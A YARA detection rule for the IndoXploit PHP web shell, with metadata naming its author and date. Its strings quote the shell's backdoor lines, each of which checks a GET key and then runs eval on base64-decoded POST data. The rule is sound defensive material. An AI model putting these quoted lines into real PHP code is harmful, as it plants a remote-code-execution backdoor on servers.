rule indoxploit_shell_v1: indoxploit phpshell
{
  meta:
      description = "IndoXploit php shell"
      author = "delyee"
      date = "05.08.2019"
    strings:
        //$q = "if ($_GET['q']=='1'){echo '200'; exit;}"
        $key = "if($_GET['key']=='sdfadsgh4513sdGG435341FDGWWDFGDFHDFGDSFGDFSGDFG')eval(base64_decode($_POST['fack']));"
        $key_md5 = "if(md5($_GET['key'])=='7663f1b3555993ad229183b0efad3261')eval(base64_decode($_POST['fack']));"
    condition:
        any of them
}
